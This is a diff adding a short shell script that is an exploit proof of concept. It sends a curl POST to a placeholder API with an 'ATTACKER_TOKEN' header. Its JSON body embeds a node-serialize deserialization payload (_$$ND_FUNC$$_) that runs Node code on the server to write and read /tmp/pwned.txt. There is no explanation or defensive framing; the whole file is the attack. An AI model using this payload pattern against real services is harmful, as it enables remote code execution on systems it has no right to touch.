@@ -1,0 +1,11 @@
+# Set API endpoint
+export API="YOUR_API_URL"
+
+# Set token (redacted)
+export TOKEN_B="ATTACKER_TOKEN"
+
+# Exploit request
+curl -X POST "$API" \
+-H "Content-Type: application/json" \
+-H "authorization: $TOKEN_B" \
+-d "{\"action\":\"_\$\$ND_FUNC\$\$_function(){var fs=require('fs');fs.writeFileSync('/tmp/pwned.txt','You are reading the contents of my hacked file');var fileData=fs.readFileSync('/tmp/pwned.txt','utf-8');console.error('FILE READ SUCCESS: '+fileData);}()\",\"cart-id\":\"\"}"
